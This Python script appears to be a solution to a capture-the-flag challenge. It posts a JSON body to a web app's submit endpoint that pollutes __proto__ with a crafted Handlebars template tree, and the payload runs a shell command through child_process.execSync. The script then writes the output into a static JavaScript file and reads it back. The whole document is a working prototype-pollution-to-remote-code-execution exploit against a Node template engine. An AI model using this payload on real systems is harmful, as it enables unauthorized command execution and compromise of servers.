#!/usr/bin/python3

import requests
import json

def connect():
    url = "http://46.101.23.188:31968/"
    submit = "api/submit"
    out = "static/js/main.js"

    headers = { 
        'Content-Type' : 'application/json', 
        'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:92.0) Gecko/20100101 Firefox/92.0',
        }

    r = requests.post(url + submit, headers=headers, json= {
    "artist.name":"Haigh",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",

            "value": "process.mainModule.require('child_process').execSync('ls > static/js/main.js')"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})
    r2 = requests.get(url + out, headers=headers)

    print(r.status_code)
    print(r.text)
    print(r2.text)
    
if __name__ == '__main__':
    connect()